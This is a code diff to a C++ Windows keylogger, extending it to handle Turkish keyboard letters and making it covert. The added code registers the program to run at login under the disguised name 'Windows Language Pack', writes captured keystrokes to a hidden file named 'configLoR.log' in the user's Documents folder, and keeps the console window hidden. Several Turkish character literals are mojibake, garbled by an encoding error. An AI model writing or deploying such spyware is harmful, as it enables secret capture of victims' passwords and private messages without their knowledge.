@@ -4,6 +4,7 @@
 #include <iostream>
 #include <sstream>
 #include <time.h>
+#include <shlobj_core.h>
 #include <map>
 
 // defines whether the window is visible or not
@@ -29,8 +30,7 @@ const std::map<int, std::string> keyname{
 	{VK_CONTROL,	"[CONTROL]" },
 	{VK_LCONTROL,	"[LCONTROL]" },
 	{VK_RCONTROL,	"[RCONTROL]" },
-	{VK_LMENU,	"[ALT]" },
-	{VK_RMENU, "[ALT GR]"},
+	{VK_MENU,	"[ALT]" },
 	{VK_LWIN,	"[LWIN]" },
 	{VK_RWIN,	"[RWIN]" },
 	{VK_ESCAPE,	"[ESCAPE]" },
@@ -164,32 +164,34 @@ int Save(int key_stroke)
 			lowercase = !lowercase;
 		}
 
-		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 		if (key_stroke == 222) {
-			key = 'Ý';
+			key = 'Ä°';
 		}
 		else if (key_stroke == 221) {
-			key = 'Ü';
+			key = 'Ãœ';
 		}
 		else if (key_stroke == 220) {
-			key = 'Ç';
+			key = 'Ã‡';
 		}
 		else if (key_stroke == 219) {
-			key = 'Ð';
+			key = 'Äž';
 		}
 		else if (key_stroke == 191) {
-			key = 'Ö';
+			key = 'Ã–';
 		}
 		else if (key_stroke == 186) {
-			key = 'Þ';
+			key = 'Åž';
+		}
+		else {
+			key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 		}
 		// tolower converts it to lowercase properly
 		if (!lowercase)
 		{
 			if (key == 'I') {
-				key = 'ý';
+				key = 'Ä±';
 			}
-			else if (key == 'Ý') {
+			if (key == 'Ä°') {
 				key = 'i';
 			}
 			else {
@@ -221,39 +223,51 @@ void Stealth()
 void AutoRun() {
 
 	LONG key;
-	DWORD value;
-	DWORD BufferSize = MAX_PATH;
-	key = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsLanguagePack", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
-	std::cout<<"*" << key << "*\n";
-	if (key == 2) {
+	char re[MAX_PATH];
+	std::string FP = std::string(re, GetModuleFileNameA(NULL, re, MAX_PATH));
+	HKEY hkey;
 
-		std::string FP;
-		char re[MAX_PATH];
-		FP = std::string(re, GetModuleFileNameA(NULL, re, MAX_PATH));
-		HKEY hkey;
-		key = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_WRITE, &hkey);
-		if (key == ERROR_SUCCESS)
-		{
-			std::cout << "paketi yüklüyoruzzz";
-			key = RegSetValueExA(hkey, "WindowsLanguagePack", 0, REG_SZ, (BYTE*)FP.c_str(), strlen(FP.c_str()));
-			RegCloseKey(hkey);
-		}
-		else {
-			std::cout << key;
-		}
+	key = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_SET_VALUE, &hkey);
+	if (ERROR_SUCCESS == key)
+	{
+		key = RegSetValueExA(hkey, "Windows Language Pack", 0, REG_SZ, (BYTE*)FP.c_str(), FP.size()+1);
+		RegCloseKey(hkey);
 	}
 	else {
-		std::cout << "value:" << value;
+		std::cout << key;
 	}
 }
 
 int main()
 {
+	//setlocale configure for turkish letter(doesnt matter if you make build invisible mode because this config for cmd image)
 	setlocale(LC_ALL, "Turkish");
+
+	char* username = nullptr;
+	size_t sz = 0;
+	std::string path_with_filename;
+	if (_dupenv_s(&username, &sz, "USERPROFILE") == 0 && username != nullptr)
+	{
+		const char* output_filename = "\\Documents\\configLoR.log";
+		path_with_filename = std::string(username) + output_filename;
+	}
+	else {
+		path_with_filename = "configLoR.log";
+	}
+	std::cout << "Logging output to " << path_with_filename << std::endl;
+
 	// open output file in append mode
-	const char* output_filename = "keylogger.log";
-	std::cout << "Logging output to " << output_filename << std::endl;
-	output_file.open(output_filename, std::ios_base::app);
+	output_file.open(path_with_filename, std::ios_base::app);
+
+	//make file hidden
+	int attr = GetFileAttributesA(path_with_filename.c_str());
+	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
+		SetFileAttributesA(path_with_filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
+		std::cout << "gizledim dosyayÄ± adamÄ±m";
+	}
+	else {
+		std::cout << attr << "dosya gizlenmiÅŸ adamÄ±m";
+	}
 
 	// visibility of window
 	Stealth();
